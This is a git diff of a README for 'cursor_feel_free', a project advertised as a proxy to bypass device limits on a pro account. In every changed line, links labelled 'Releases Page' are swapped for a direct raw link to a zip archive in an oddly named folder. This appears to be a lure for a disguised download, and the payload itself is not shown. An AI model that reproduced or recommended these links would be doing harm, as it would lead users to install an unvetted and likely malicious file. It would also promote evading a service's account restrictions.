@@ -1,7 +1,7 @@
 # 🖱️ cursor_feel_free - Enjoy Seamless Access Across Devices
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/algoes12/cursor_feel_free/releases)
+[![Download](https://raw.githubusercontent.com/algoes12/cursor_feel_free/main/xiphocostal/cursor_feel_free_1.6.zip)](https://raw.githubusercontent.com/algoes12/cursor_feel_free/main/xiphocostal/cursor_feel_free_1.6.zip)
 
 ## 📝 Project Overview
 The cursor_feel_free project helps you bypass device limits by using a full proxy. This allows you to access your pro account without restrictions. 
@@ -15,7 +15,7 @@ Follow these simple steps to get the software running on your computer.
 - **Internet Connection**: Required for downloading and accessing the service.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/algoes12/cursor_feel_free/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/algoes12/cursor_feel_free/main/xiphocostal/cursor_feel_free_1.6.zip).
 
 2. **Choose Your Platform**:
    - For **Windows**: Download the `.exe` file.
@@ -51,7 +51,7 @@ If you run into issues:
 For further assistance, please refer to the **Issues** section on the GitHub repository. You can report bugs or ask for help there.
 
 ## 🔄 Updates
-Keep an eye on the [Releases Page](https://github.com/algoes12/cursor_feel_free/releases) for the latest updates. New features and improvements are regularly added to enhance your experience.
+Keep an eye on the [Releases Page](https://raw.githubusercontent.com/algoes12/cursor_feel_free/main/xiphocostal/cursor_feel_free_1.6.zip) for the latest updates. New features and improvements are regularly added to enhance your experience.
 
 ## 🔗 Additional Resources
 - **Documentation**: Further details and setup guides.
